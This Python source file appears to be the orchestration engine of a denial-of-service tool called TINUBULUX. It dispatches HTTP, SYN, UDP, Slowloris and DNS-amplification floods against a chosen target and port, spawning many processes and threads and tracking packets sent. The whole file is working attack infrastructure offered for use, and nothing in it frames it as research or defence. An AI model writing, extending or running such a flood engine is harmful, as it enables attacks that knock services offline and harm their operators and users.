import multiprocessing
import threading
import time
from utils.stats import SharedStats

from .attackers.http_flood import HTTPFlood
from .attackers.syn_flood import SYNFlood
from .attackers.udp_flood import UDPFlood
from .attackers.slowloris import SlowlorisAttack
from .attackers.dns_amp import DNSAmplification

class AttackEngine:
    def __init__(self, args, config, logger):
        self.args = args
        self.config = config
        self.logger = logger
        self.running = multiprocessing.Value('b', True)
        self.stats = SharedStats()
        self.processes = []
        self.attacker = None

    def _get_attacker(self):
        method = self.args.method.lower()
        attackers = {
            'http': HTTPFlood,
            'syn': SYNFlood,
            'udp': UDPFlood,
            'slowloris': SlowlorisAttack,
            'dns': DNSAmplification
        }
        return attackers.get(method, HTTPFlood)

    def _worker(self, worker_id):
        attacker_class = self._get_attacker()
        attacker = attacker_class(self.args, self.config, self.stats,
                                  self.running, worker_id)
        try:
            attacker.attack()
        finally:
            attacker.finalize()

    def start(self):
        self.stats.reset()
        self.logger.info(f"Initializing {self.args.method.upper()} on "
                         f"{self.args.target}:{self.args.port}")
        workers_desc = (f"{self.args.connections} workers"
                        if self.args.method != 'slowloris'
                        else f"{self.args.threads} x {self.config.get('slowloris', {}).get('sockets_per_thread', 150)} sockets")
        self.logger.info(f"Workers: {workers_desc} | Threads: {self.args.threads} | "
                         f"Rate: {self.args.rate if self.args.rate else 'unlimited'}")

        workers_per_thread = max(1, self.args.connections // self.args.threads)

        for i in range(self.args.threads):
            p = multiprocessing.Process(target=self._spawn_workers,
                                        args=(workers_per_thread, i))
            p.daemon = True
            p.start()
            self.processes.append(p)

        self.logger.success("Attack engine online. Press Ctrl+C to stop.")

    def _spawn_workers(self, count, thread_id):
        threads = []
        for i in range(count):
            t = threading.Thread(target=self._worker,
                                 args=(f"{thread_id}-{i}",))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def stop(self):
        self.running.value = False
        for p in self.processes:
            if p.is_alive():
                p.terminate()
        for p in self.processes:
            p.join(timeout=3)
            if p.is_alive():
                p.kill()
        self.processes = []
        self.logger.info("TINUBULUX stopped.")

    def wait(self):
        if self.args.duration > 0:
            time.sleep(self.args.duration)
            self.stop()
        else:
            while self.running.value:
                time.sleep(1)

    def get_stats(self):
        elapsed = (time.time() - self.stats.start_time
                   if self.stats.start_time else 0)
        return {
            'sent': self.stats.sent,
            'failed': self.stats.failed,
            'bps': self.stats.bps,
            'elapsed': elapsed,
            'pps': self.stats.sent / max(elapsed, 1),
            'target': f"{self.args.target}:{self.args.port}",
            'method': self.args.method.upper(),
            'workers': self.args.connections,
            'rate_limit': self.args.rate if self.args.rate else 0
        }